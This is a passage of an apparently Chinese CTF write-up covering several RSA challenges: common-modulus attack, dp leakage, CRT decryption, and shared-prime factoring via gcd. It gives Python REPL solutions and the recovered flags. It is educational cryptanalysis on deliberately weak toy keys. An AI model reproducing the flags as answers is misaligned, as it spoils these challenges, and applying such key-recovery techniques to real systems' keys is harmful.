class="hljs-built_in">pow</span>(c,d,n)</span><br><span class="hljs-meta">...</span> <span class="python">            <span class="hljs-built_in">print</span> <span class="hljs-built_in">hex</span>(m)[<span class="hljs-number">2</span>:].decode(<span class="hljs-string">&#x27;hex&#x27;</span>)</span><br><span class="hljs-meta">...</span><br><span class="hljs-meta">...</span><br><span class="hljs-meta">...</span><br><span class="hljs-meta">...</span><br>flag&#123;cef4c0553ae4a3cd4da5aea6899669e3cbdec184&#125;<br></code></pre></td></tr></table></figure>
<p>其实很容易推出公式</p>
<h2 id="RSA3"><a href="#RSA3" class="headerlink" title="RSA3"></a>RSA3</h2><p>共模攻击板子<br>c1=22322035275663237041646893770451933509324701913484303338076210603542612758956262869640822486470121149424485571361007421293675516338822195280313794991136048140918842471219840263536338886250492682739436410013436651161720725855484866690084788721349555662019879081501113222996123305533009325964377798892703161521852805956811219563883312896330156298621674684353919547558127920925706842808914762199011054955816534977675267395009575347820387073483928425066536361482774892370969520740304287456555508933372782327506569010772537497541764311429052216291198932092617792645253901478910801592878203564861118912045464959832566051361<br>n=22708078815885011462462049064339185898712439277226831073457888403129378547350292420267016551819052430779004755846649044001024141485283286483130702616057274698473611149508798869706347501931583117632710700787228016480127677393649929530416598686027354216422565934459015161927613607902831542857977859612596282353679327773303727004407262197231586324599181983572622404590354084541788062262164510140605868122410388090174420147752408554129789760902300898046273909007852818474030770699647647363015102118956737673941354217692696044969695308506436573142565573487583507037356944848039864382339216266670673567488871508925311154801<br>e1=11187289<br>c2=18702010045187015556548691642394982835669262147230212731309938675226458555210425972429418449273410535387985931036711854265623905066805665751803269106880746769003478900791099590239513925449748814075904017471585572848473556490565450062664706449128415834787961947266259789785962922238701134079720414228414066193071495304612341052987455615930023536823801499269773357186087452747500840640419365011554421183037505653461286732740983702740822671148045619497667184586123657285604061875653909567822328914065337797733444640351518775487649819978262363617265797982843179630888729407238496650987720428708217115257989007867331698397<br>e2=9647291</p>
<figure class="highlight python-repl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs python-repl"><span class="hljs-meta">&gt;&gt;&gt;</span> <span class="python">gcd, s, t = gmpy2.gcdext(e1, e2)</span><br><span class="hljs-meta">&gt;&gt;&gt;</span> <span class="python"><span class="hljs-keyword">if</span> s &lt; <span class="hljs-number">0</span>:</span><br><span class="hljs-meta">...</span> <span class="python">    s = -s</span><br><span class="hljs-meta">...</span> <span class="python">    c1 = gmpy2.invert(c1, n)</span><br><span class="hljs-meta">...</span> <span class="python"><span class="hljs-keyword">elif</span> t &lt; <span class="hljs-number">0</span>:</span><br><span class="hljs-meta">...</span> <span class="python">    t = -t</span><br><span class="hljs-meta">...</span> <span class="python">    c2 = gmpy2.invert(c2, n)</span><br><span class="hljs-meta">&gt;&gt;&gt;</span> <span class="python">plain = <span class="hljs-built_in">pow</span>(c1, s, n) * <span class="hljs-built_in">pow</span>(c2, t, n) % n</span><br><span class="hljs-meta">&gt;&gt;&gt;</span> <span class="python"><span class="hljs-built_in">print</span> <span class="hljs-built_in">hex</span>(plain)[<span class="hljs-number">2</span>:].decode(<span class="hljs-string">&#x27;hex&#x27;</span>)</span><br>flag&#123;49d91077a1abcb14f1a9d546c80be9ef&#125;<br></code></pre></td></tr></table></figure>
<h2 id="RSA2"><a href="#RSA2" class="headerlink" title="RSA2"></a>RSA2</h2><p>e = 65537<br>n = 248254007851526241177721526698901802985832766176221609612258877371620580060433101538328030305219918697643619814200930679612109885533801335348445023751670478437073055544724280684733298051599167660303645183146161497485358633681492129668802402065797789905550489547645118787266601929429724133167768465309665906113<br>dp = 905074498052346904643025132879518330691925174573054004621877253318682675055421970943552016695528560364834446303196939207056642927148093290374440210503657</p>
<p>c = 140423670976252696807533673586209400575664282100684119784203527124521188996403826597436883766041879067494280957410201958935737360380801845453829293997433414188838725751796261702622028587211560353362847191060306578510511380965162133472698713063592621028959167072781482562673683090590521214218071160287665180751<br>和上面某题一模一样的写法啊</p>
<figure class="highlight python-repl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs python-repl"><span class="hljs-meta">&gt;&gt;&gt;</span> <span class="python"><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>,<span class="hljs-number">65538</span>):</span><br><span class="hljs-meta">...</span> <span class="python">    <span class="hljs-keyword">if</span> (e*dp-<span class="hljs-number">1</span>)%i==<span class="hljs-number">0</span>:</span><br><span class="hljs-meta">...</span> <span class="python">        <span class="hljs-keyword">if</span> n%((e*dp-<span class="hljs-number">1</span>)//i+<span class="hljs-number">1</span>)==<span class="hljs-number">0</span>:</span><br><span class="hljs-meta">...</span> <span class="python">            p = (e*dp-<span class="hljs-number">1</span>)//i+<span class="hljs-number">1</span></span><br><span class="hljs-meta">...</span> <span class="python">            q = n//p</span><br><span class="hljs-meta">&gt;&gt;&gt;</span> <span class="python">phi = (p-<span class="hljs-number">1</span>)*(q-<span class="hljs-number">1</span>)</span><br><span class="hljs-meta">&gt;&gt;&gt;</span> <span class="python">d = gmpy2.invert(e,phi)</span><br><span class="hljs-meta">&gt;&gt;&gt;</span> <span class="python">m = <span class="hljs-built_in">pow</span>(c,d,n)</span><br><span class="hljs-meta">&gt;&gt;&gt;</span> <span class="python"><span class="hljs-built_in">print</span> <span class="hljs-built_in">hex</span>(m)[<span class="hljs-number">2</span>:].decode(<span class="hljs-string">&#x27;hex&#x27;</span>)</span><br>flag&#123;wow_leaking_dp_breaks_rsa?_98924743502&#125;<br></code></pre></td></tr></table></figure>
<h2 id="RSA1"><a href="#RSA1" class="headerlink" title="RSA1"></a>RSA1</h2><p>p = 8637633767257008567099653486541091171320491509433615447539162437911244175885667806398411790524083553445158113502227745206205327690939504032994699902053229<br>q = 12640674973996472769176047937170883420927050821480010581593137135372473880595613737337630629752577346147039284030082593490776630572584959954205336880228469<br>dp = 6500795702216834621109042351193261530650043841056252930930949663358625016881832840728066026150264693076109354874099841380454881716097778307268116910582929<br>dq = 783472263673553449019532580386470672380574033551303889137911760438881683674556098098256795673512201963002175438762767516968043599582527539160811120550041<br>c = 24722305403887382073567316467649080662631552905960229399079107995602154418176056335800638887527614164073530437657085079676157350205351945222989351316076486573599576041978339872265925062764318536089007310270278526159678937431903862892400747915525118983959970607934142974736675784325993445942031372107342103852<br>中国剩余定理<br>推出公式来解决</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> gmpy2<br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">decrypt</span>(<span class="hljs-params">dp,dq,p,q,c</span>):</span><br>	InvQ = gmpy2.invert(q, p)<br>	mp = <span class="hljs-built_in">pow</span>(c, dp, p)<br>	mq = <span class="hljs-built_in">pow</span>(c, dq, q)<br>	m = (((mp-mq)*InvQ) % p)*q+mq<br>	<span class="hljs-built_in">print</span> <span class="hljs-built_in">hex</span>(m)[<span class="hljs-number">2</span>:].decode(<span class="hljs-string">&#x27;hex&#x27;</span>)<br></code></pre></td></tr></table></figure>
<p>直接用现成轮子</p>
<h2 id="RSA5"><a href="#RSA5" class="headerlink" title="RSA5"></a>RSA5</h2><figure class="highlight nix"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><code class="hljs nix"><span class="hljs-attr">m</span> = xxxxxxxx<br><span class="hljs-attr">e</span> = <span class="hljs-number">65537</span><br>========== n <span class="hljs-attr">c</span> ==========<br><span class="hljs-attr">n</span> = <span class="hljs-number">20474918894051778533305262345601880928088284471121823754049725354072477155873778848055073843345820697886641086842612486541250183965966001591342031562953561793332341641334302847996108417466360688139866505179689516589305636902137210185624650854906780037204412206309949199080005576922775773722438863762117750429327585792093447423980002401200613302943834212820909269713876683465817369158585822294675056978970612202885426436071950214538262921077409076160417436699836138801162621314845608796870206834704116707763169847387223307828908570944984416973019427529790029089766264949078038669523465243837675263858062854739083634207</span><br><span class="hljs-attr">c</span> = <span class="hljs-number">974463908243330865728978769213595400782053398596897741316275722596415018912929508637393850919224969271766388710025195039896961956062895570062146947736340342927974992616678893372744261954172873490878805483241196345881721164078651156067119957816422768524442025688079462656755605982104174001635345874022133045402344010045961111720151990412034477755851802769069309069018738541854130183692204758761427121279982002993939745343695671900015296790637464880337375511536424796890996526681200633086841036320395847725935744757993013352804650575068136129295591306569213300156333650910795946800820067494143364885842896291126137320</span><br><br><span class="hljs-attr">n</span> = <span class="hljs-number">20918819960648891349438263046954902210959146407860980742165930253781318759285692492511475263234242002509419079545644051755251311392635763412553499744506421566074721268822337321637265942226790343839856182100575539845358877493718334237585821263388181126545189723429262149630651289446553402190531135520836104217160268349688525168375213462570213612845898989694324269410202496871688649978370284661017399056903931840656757330859626183773396574056413017367606446540199973155630466239453637232936904063706551160650295031273385619470740593510267285957905801566362502262757750629162937373721291789527659531499435235261620309759</span><br><span class="hljs-attr">c</span> = <span class="hljs-number">15819636201971185538694880505120469332582151856714070824521803121848292387556864177196229718923770810072104155432038682511434979353089791861087415144087855679134383396897817458726543883093567600325204596156649305930352575274039425470836355002691145864435755333821133969266951545158052745938252574301327696822347115053614052423028835532509220641378760800693351542633860702225772638930501021571415907348128269681224178300248272689705308911282208685459668200507057183420662959113956077584781737983254788703048275698921427029884282557468334399677849962342196140864403989162117738206246183665814938783122909930082802031855</span><br><br><span class="hljs-attr">n</span> = <span class="hljs-number">25033254625906757272369609119214202033162128625171246436639570615263949157363273213121556825878737923265290579551873824374870957467163989542063489416636713654642486717219231225074115269684119428086352535471683359486248203644461465935500517901513233739152882943010177276545128308412934555830087776128355125932914846459470221102007666912211992310538890654396487111705385730502843589727289829692152177134753098649781412247065660637826282055169991824099110916576856188876975621376606634258927784025787142263367152947108720757222446686415627479703666031871635656314282727051189190889008763055811680040315277078928068816491</span><br><span class="hljs-attr">c</span> = <span class="hljs-number">4185308529416874005831230781014092407198451385955677399668501833902623478395669279404883990725184332709152443372583701076198786635291739356770857286702107156730020004358955622511061410661058982622055199736820808203841446796305284394651714430918690389486920560834672316158146453183789412140939029029324756035358081754426645160033262924330248675216108270980157049705488620263485129480952814764002865280019185127662449318324279383277766416258142275143923532168798413011028271543085249029048997452212503111742302302065401051458066585395360468447460658672952851643547193822775218387853623453638025492389122204507555908862</span><br><br><span class="hljs-attr">n</span> = <span class="hljs-number">21206968097314131007183427944486801953583151151443627943113736996776787181111063957960698092696800555044199156765677935373149598221184792286812213294617749834607696302116136745662816658117055427803315230042700695125718401646810484873064775005221089174056824724922160855810527236751389605017579545235876864998419873065217294820244730785120525126565815560229001887622837549118168081685183371092395128598125004730268910276024806808565802081366898904032509920453785997056150497645234925528883879419642189109649009132381586673390027614766605038951015853086721168018787523459264932165046816881682774229243688581614306480751</span><br><span class="hljs-attr">c</span> = <span class="hljs-number">4521038011044758441891128468467233088493885750850588985708519911154778090597136126150289041893454126674468141393472662337350361712212694867311622970440707727941113263832357173141775855227973742571088974593476302084111770625764222838366277559560887042948859892138551472680654517814916609279748365580610712259856677740518477086531592233107175470068291903607505799432931989663707477017904611426213770238397005743730386080031955694158466558475599751940245039167629126576784024482348452868313417471542956778285567779435940267140679906686531862467627238401003459101637191297209422470388121802536569761414457618258343550613</span><br><br><span class="hljs-attr">n</span> = <span class="hljs-number">22822039733049388110936778173014765663663303811791283234361230649775805923902173438553927805407463106104699773994158375704033093471761387799852168337898526980521753614307899669015931387819927421875316304591521901592823814417756447695701045846773508629371397013053684553042185725059996791532391626429712416994990889693732805181947970071429309599614973772736556299404246424791660679253884940021728846906344198854779191951739719342908761330661910477119933428550774242910420952496929605686154799487839923424336353747442153571678064520763149793294360787821751703543288696726923909670396821551053048035619499706391118145067</span><br><span class="hljs-attr">c</span> = <span class="hljs-number">15406498580761780108625891878008526815145372096234083936681442225155097299264808624358826686906535594853622687379268969468433072388149786607395396424104318820879443743112358706546753935215756078345959375299650718555759698887852318017597503074317356745122514481807843745626429797861463012940172797612589031686718185390345389295851075279278516147076602270178540690147808314172798987497259330037810328523464851895621851859027823681655934104713689539848047163088666896473665500158179046196538210778897730209572708430067658411755959866033531700460551556380993982706171848970460224304996455600503982223448904878212849412357</span><br><br><span class="hljs-attr">n</span> = <span class="hljs-number">21574139855341432908474064784318462018475296809327285532337706940126942575349507668289214078026102682252713757703081553093108823214063791518482289846780197329821139507974763780260290309600884920811959842925540583967085670848765317877441480914852329276375776405689784571404635852204097622600656222714808541872252335877037561388406257181715278766652824786376262249274960467193961956690974853679795249158751078422296580367506219719738762159965958877806187461070689071290948181949561254144310776943334859775121650186245846031720507944987838489723127897223416802436021278671237227993686791944711422345000479751187704426369</span><br><span class="hljs-attr">c</span> = <span class="hljs-number">20366856150710305124583065375297661819795242238376485264951185336996083744604593418983336285185491197426018595031444652123288461491879021096028203694136683203441692987069563513026001861435722117985559909692670907347563594578265880806540396777223906955491026286843168637367593400342814725694366078337030937104035993569672959361347287894143027186846856772983058328919716702982222142848848117768499996617588305301483085428547267337070998767412540225911508196842253134355901263861121500650240296746702967594224401650220168780537141654489215019142122284308116284129004257364769474080721001708734051264841350424152506027932</span><br><br><span class="hljs-attr">n</span> = <span class="hljs-number">25360227412666612490102161131174584819240931803196448481224305250583841439581008528535930814167338381983764991296575637231916547647970573758269411168219302370541684789125112505021148506809643081950237623703181025696585998044695691322012183660424636496897073045557400768745943787342548267386564625462143150176113656264450210023925571945961405709276631990731602198104287528528055650050486159837612279600415259486306154947514005408907590083747758953115486124865486720633820559135063440942528031402951958557630833503775112010715604278114325528993771081233535247118481765852273252404963430792898948219539473312462979849137</span><br><span class="hljs-attr">c</span> = <span class="hljs-number">19892772524651452341027595619482734356243435671592398172680379981502759695784087900669089919987705675899945658648623800090272599154590123082189645021800958076861518397325439521139995652026377132368232502108620033400051346127757698623886142621793423225749240286511666556091787851683978017506983310073524398287279737680091787333547538239920607761080988243639547570818363788673249582783015475682109984715293163137324439862838574460108793714172603672477766831356411304446881998674779501188163600664488032943639694828698984739492200699684462748922883550002652913518229322945040819064133350314536378694523704793396169065179</span><br><br><span class="hljs-attr">n</span> = <span class="hljs-number">22726855244632356029159691753451822163331519237547639938779517751496498713174588935566576167329576494790219360727877166074136496129927296296996970048082870488804456564986667129388136556137013346228118981936899510687589585286517151323048293150257036847475424044378109168179412287889340596394755257704938006162677656581509375471102546261355748251869048003600520034656264521931808651038524134185732929570384705918563982065684145766427962502261522481994191989820110575981906998431553107525542001187655703534683231777988419268338249547641335718393312295800044734534761692799403469497954062897856299031257454735945867491191</span><br><span class="hljs-attr">c</span> = <span class="hljs-number">6040119795175856407541082360023532204614723858688636724822712717572759793960246341800308149739809871234313049629732934797569781053000686185666374833978403290525072598774001731350244744590772795701065129561898116576499984185920661271123665356132719193665474235596884239108030605882777868856122378222681140570519180321286976947154042272622411303981011302586225630859892731724640574658125478287115198406253847367979883768000812605395482952698689604477719478947595442185921480652637868335673233200662100621025061500895729605305665864693122952557361871523165300206070325660353095592778037767395360329231331322823610060006</span><br><br><span class="hljs-attr">n</span> = <span class="hljs-number">23297333791443053297363000786835336095252290818461950054542658327484507406594632785712767459958917943095522594228205423428207345128899745800927319147257669773812669542782839237744305180098276578841929496345963997512244219376701787616046235397139381894837435562662591060768476997333538748065294033141610502252325292801816812268934171361934399951548627267791401089703937389012586581080223313060159456238857080740699528666411303029934807011214953984169785844714159627792016926490955282697877141614638806397689306795328344778478692084754216753425842557818899467945102646776342655167655384224860504086083147841252232760941</span><br><span class="hljs-attr">c</span> = <span class="hljs-number">5418120301208378713115889465579964257871814114515046096090960159737859076829258516920361577853903925954198406843757303687557848302302200229295916902430205737843601806700738234756698575708612424928480440868739120075888681672062206529156566421276611107802917418993625029690627196813830326369874249777619239603300605876865967515719079797115910578653562787899019310139945904958024882417833736304894765433489476234575356755275147256577387022873348906900149634940747104513850154118106991137072643308620284663108283052245750945228995387803432128842152251549292698947407663643895853432650029352092018372834457054271102816934</span><br><br><span class="hljs-attr">n</span> = <span class="hljs-number">28873667904715682722987234293493200306976947898711255064125115933666968678742598858722431426218914462903521596341771131695619382266194233561677824357379805303885993804266436810606263022097900266975250431575654686915049693091467864820512767070713267708993899899011156106766178906700336111712803362113039613548672937053397875663144794018087017731949087794894903737682383916173267421403408140967713071026001874733487295007501068871044649170615709891451856792232315526696220161842742664778581287321318748202431466508948902745314372299799561625186955234673012098210919745879882268512656931714326782335211089576897310591491</span><br><span class="hljs-attr">c</span> = <span class="hljs-number">9919880463786836684987957979091527477471444996392375244075527841865509160181666543016317634963512437510324198702416322841377489417029572388474450075801462996825244657530286107428186354172836716502817609070590929769261932324275353289939302536440310628698349244872064005700644520223727670950787924296004296883032978941200883362653993351638545860207179022472492671256630427228461852668118035317021428675954874947015197745916918197725121122236369382741533983023462255913924692806249387449016629865823316402366017657844166919846683497851842388058283856219900535567427103603869955066193425501385255322097901531402103883869</span><br><br><span class="hljs-attr">n</span> = <span class="hljs-number">22324685947539653722499932469409607533065419157347813961958075689047690465266404384199483683908594787312445528159635527833904475801890381455653807265501217328757871352731293000303438205315816792663917579066674842307743845261771032363928568844669895768092515658328756229245837025261744260614860746997931503548788509983868038349720225305730985576293675269073709022350700836510054067641753713212999954307022524495885583361707378513742162566339010134354907863733205921845038918224463903789841881400814074587261720283879760122070901466517118265422863420376921536734845502100251460872499122236686832189549698020737176683019</span><br><span class="hljs-attr">c</span> = <span class="hljs-number">1491527050203294989882829248560395184804977277747126143103957219164624187528441047837351263580440686474767380464005540264627910126483129930668344095814547592115061057843470131498075060420395111008619027199037019925701236660166563068245683975787762804359520164701691690916482591026138582705558246869496162759780878437137960823000043988227303003876410503121370163303711603359430764539337597866862508451528158285103251810058741879687875218384160282506172706613359477657215420734816049393339593755489218588796607060261897905233453268671411610631047340459487937479511933450369462213795738933019001471803157607791738538467</span><br><br><span class="hljs-attr">n</span> = <span class="hljs-number">27646746423759020111007828653264027999257847645666129907789026054594393648800236117046769112762641778865620892443423100189619327585811384883515424918752749559627553637785037359639801125213256163008431942593727931931898199727552768626775618479833029101249692573716030706695702510982283555740851047022672485743432464647772882314215176114732257497240284164016914018689044557218920300262234652840632406067273375269301008409860193180822366735877288205783314326102263756503786736122321348320031950012144905869556204017430593656052867939493633163499580242224763404338807022510136217187779084917996171602737036564991036724299</span><br><span class="hljs-attr">c</span> = <span class="hljs-number">21991524128957260536043771284854920393105808126700128222125856775506885721971193109361315961129190814674647136464887087893990660894961612838205086401018885457667488911898654270235561980111174603323721280911197488286585269356849579263043456316319476495888696219344219866516861187654180509247881251251278919346267129904739277386289240394384575124331135655943513831009934023397457082184699737734388823763306805326430395849935770213817533387235486307008892410920611669932693018165569417445885810825749609388627231235840912644654685819620931663346297596334834498661789016450371769203650109994771872404185770230172934013971</span><br><br><span class="hljs-attr">n</span> = <span class="hljs-number">20545487405816928731738988374475012686827933709789784391855706835136270270933401203019329136937650878386117187776530639342572123237188053978622697282521473917978282830432161153221216194169879669541998840691383025487220850872075436064308499924958517979727954402965612196081404341651517326364041519250125036424822634354268773895465698920883439222996581226358595873993976604699830613932320720554130011671297944433515047180565484495191003887599891289037982010216357831078328159028953222056918189365840711588671093333013117454034313622855082795813122338562446223041211192277089225078324682108033843023903550172891959673551</span><br><span class="hljs-attr">c</span> = <span class="hljs-number">14227439188191029461250476692790539654619199888487319429114414557975376308688908028140817157205579804059783807641305577385724758530138514972962209062230576107406142402603484375626077345190883094097636019771377866339531511965136650567412363889183159616188449263752475328663245311059988337996047359263288837436305588848044572937759424466586870280512424336807064729894515840552404756879590698797046333336445465120445087587621743906624279621779634772378802959109714400516183718323267273824736540168545946444437586299214110424738159957388350785999348535171553569373088251552712391288365295267665691357719616011613628772175</span><br><br><span class="hljs-attr">n</span> = <span class="hljs-number">27359727711584277234897157724055852794019216845229798938655814269460046384353568138598567755392559653460949444557879120040796798142218939251844762461270251672399546774067275348291003962551964648742053215424620256999345448398805278592777049668281558312871773979931343097806878701114056030041506690476954254006592555275342579529625231194321357904668512121539514880704046969974898412095675082585315458267591016734924646294357666924293908418345508902112711075232047998775303603175363964055048589769318562104883659754974955561725694779754279606726358588862479198815999276839234952142017210593887371950645418417355912567987</span><br><span class="hljs-attr">c</span> = <span class="hljs-number">3788529784248255027081674540877016372807848222776887920453488878247137930578296797437647922494510483767651150492933356093288965943741570268943861987024276610712717409139946409513963043114463933146088430004237747163422802959250296602570649363016151581364006795894226599584708072582696996740518887606785460775851029814280359385763091078902301957226484620428513604630585131511167015763190591225884202772840456563643159507805711004113901417503751181050823638207803533111429510911616160851391754754434764819568054850823810901159821297849790005646102129354035735350124476838786661542089045509656910348676742844957008857457</span><br><br><span class="hljs-attr">n</span> = <span class="hljs-number">27545937603751737248785220891735796468973329738076209144079921449967292572349424539010502287564030116831261268197384650511043068738911429169730640135947800885987171539267214611907687570587001933829208655100828045651391618089603288456570334500533178695238407684702251252671579371018651675054368606282524673369983034682330578308769886456335818733827237294570476853673552685361689144261552895758266522393004116017849397346259119221063821663280935820440671825601452417487330105280889520007917979115568067161590058277418371493228631232457972494285014767469893647892888681433965857496916110704944758070268626897045014782837</span><br><span class="hljs-attr">c</span> = <span class="hljs-number">14069112970608895732417039977542732665796601893762401500878786871680645798754783315693511261740059725171342404186571066972546332813667711135661176659424619936101038903439144294886379322591635766682645179888058617577572409307484708171144488708410543462972008179994594087473935638026612679389759756811490524127195628741262871304427908481214992471182859308828778119005750928935764927967212343526503410515793717201360360437981322576798056276657140363332700714732224848346808963992302409037706094588964170239521193589470070839790404597252990818583717869140229811712295005710540476356743378906642267045723633874011649259842</span><br><br><span class="hljs-attr">n</span> = <span class="hljs-number">25746162075697911560263181791216433062574178572424600336856278176112733054431463253903433128232709054141607100891177804285813783247735063753406524678030561284491481221681954564804141454666928657549670266775659862814924386584148785453647316864935942772919140563506305666207816897601862713092809234429096584753263707828899780979223118181009293655563146526792388913462557306433664296966331469906428665127438829399703002867800269947855869262036714256550075520193125987011945192273531732276641728008406855871598678936585324782438668746810516660152018244253008092470066555687277138937298747951929576231036251316270602513451</span><br><span class="hljs-attr">c</span> = <span class="hljs-number">17344284860275489477491525819922855326792275128719709401292545608122859829827462088390044612234967551682879954301458425842831995513832410355328065562098763660326163262033200347338773439095709944202252494552172589503915965931524326523663289777583152664722241920800537867331030623906674081852296232306336271542832728410803631170229642717524942332390842467035143631504401140727083270732464237443915263865880580308776111219718961746378842924644142127243573824972533819479079381023103585862099063382129757560124074676150622288706094110075567706403442920696472627797607697962873026112240527498308535903232663939028587036724</span><br><br><span class="hljs-attr">n</span> = <span class="hljs-number">23288486934117120315036919418588136227028485494137930196323715336208849327833965693894670567217971727921243839129969128783853015760155446770590696037582684845937132790047363216362087277861336964760890214059732779383020349204803205725870225429985939570141508220041286857810048164696707018663758416807708910671477407366098883430811861933014973409390179948577712579749352299440310543689035651465399867908428885541237776143404376333442949397063249223702355051571790555151203866821867908531733788784978667478707672984539512431549558672467752712004519300318999208102076732501412589104904734983789895358753664077486894529499</span><br><span class="hljs-attr">c</span> = <span class="hljs-number">10738254418114076548071448844964046468141621740603214384986354189105236977071001429271560636428075970459890958274941762528116445171161040040833357876134689749846940052619392750394683504816081193432350669452446113285638982551762586656329109007214019944975816434827768882704630460001209452239162896576191876324662333153835533956600295255158377025198426950944040643235430211011063586032467724329735785947372051759042138171054165854842472990583800899984893232549092766400510300083585513014171220423103452292891496141806956300396540682381668367564569427813092064053993103537635994311143010708814851867239706492577203899024</span><br><br><span class="hljs-attr">n</span> = <span class="hljs-number">19591441383958529435598729113936346657001352578357909347657257239777540424811749817783061233235817916560689138344041497732749011519736303038986277394036718790971374656832741054547056417771501234494768509780369075443550907847298246275717420562375114406055733620258777905222169702036494045086017381084272496162770259955811174440490126514747876661317750649488774992348005044389081101686016446219264069971370646319546429782904810063020324704138495608761532563310699753322444871060383693044481932265801505819646998535192083036872551683405766123968487907648980900712118052346174533513978009131757167547595857552370586353973</span><br><span class="hljs-attr">c</span> = <span class="hljs-number">3834917098887202931981968704659119341624432294759361919553937551053499607440333234018189141970246302299385742548278589896033282894981200353270637127213483172182529890495903425649116755901631101665876301799865612717750360089085179142750664603454193642053016384714515855868368723508922271767190285521137785688075622832924829248362774476456232826885801046969384519549385428259591566716890844604696258783639390854153039329480726205147199247183621535172450825979047132495439603840806501254997167051142427157381799890725323765558803808030109468048682252028720241357478614704610089120810367192414352034177484688502364022887</span><br><br><span class="hljs-attr">n</span> = <span class="hljs-number">19254242571588430171308191757871261075358521158624745702744057556054652332495961196795369630484782930292003238730267396462491733557715379956969694238267908985251699834707734400775311452868924330866502429576951934279223234676654749272932769107390976321208605516299532560054081301829440688796904635446986081691156842271268059970762004259219036753174909942343204432795076377432107630203621754552804124408792358220071862369443201584155711893388877350138023238624566616551246804054720492816226651467017802504094070614892556444425915920269485861799532473383304622064493223627552558344088839860178294589481899206318863310603</span><br><span class="hljs-attr">c</span> = <span class="hljs-number">6790553533991297205804561991225493105312398825187682250780197510784765226429663284220400480563039341938599783346724051076211265663468643826430109013245014035811178295081939958687087477312867720289964506097819762095244479129359998867671811819738196687884696680463458661374310994610760009474264115750204920875527434486437536623589684519411519100170291423367424938566820315486507444202022408003879118465761273916755290898112991525546114191064022991329724370064632569903856189236177894007766690782630247443895358893983735822824243487181851098787271270256780891094405121947631088729917398317652320497765101790132679171889</span><br><br><span class="hljs-attr">n</span> = <span class="hljs-number">26809700251171279102974962949184411136459372267620535198421449833298448092580497485301953796619185339316064387798092220298630428207556482805739803420279056191194360049651767412572609187680508073074653291350998253938793269214230457117194434853888765303403385824786231859450351212449404870776320297419712486574804794325602760347306432927281716160368830187944940128907971027838510079519466846176106565164730963988892400240063089397720414921398936399927948235195085202171264728816184532651138221862240969655185596628285814057082448321749567943946273776184657698104465062749244327092588237927996419620170254423837876806659</span><br><span class="hljs-attr">c</span> = <span class="hljs-number">386213556608434013769864727123879412041991271528990528548507451210692618986652870424632219424601677524265011043146748309774067894985069288067952546139416819404039688454756044862784630882833496090822568580572859029800646671301748901528132153712913301179254879877441322285914544974519727307311002330350534857867516466612474769753577858660075830592891403551867246057397839688329172530177187042229028685862036140779065771061933528137423019407311473581832405899089709251747002788032002094495379614686544672969073249309703482556386024622814731015767810042969813752548617464974915714425595351940266077021672409858645427346</span><br></code></pre></td></tr></table></figure>
<p>模不互素<br>找到俩组看gcd</p>
<figure class="highlight python-repl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs python-repl"><span class="hljs-meta">&gt;&gt;&gt;</span> <span class="python"><span class="hljs-built_in">print</span> gmpy2.gcd(n8,n5)</span><br>1325858063837986003054269573076125676042235626267641902113331362466437238110461493378529668287290524<br>7672555236113243737052154870766497712316527930505297186801275550916040864110054874404662151687798186<br>4180076497524093201404558036301820216274968638825245150755772559259575544101918590311068466601618472<br>464832499<br><span class="hljs-meta">&gt;&gt;&gt;</span> <span class="python">p=<span class="hljs-number">1325858063837986003054269573076125676042235626267641902113331362466437238110461493378529668287</span></span><br>2905247672555236113243737052154870766497712316527930505297186801275550916040864110054874404662151687<br>7981864180076497524093201404558036301820216274968638825245150755772559259575544101918590311068466601<br>618472464832499<br><span class="hljs-meta">&gt;&gt;&gt;</span> <span class="python">q = n8//p</span><br><span class="hljs-meta">&gt;&gt;&gt;</span> <span class="python">c = <span 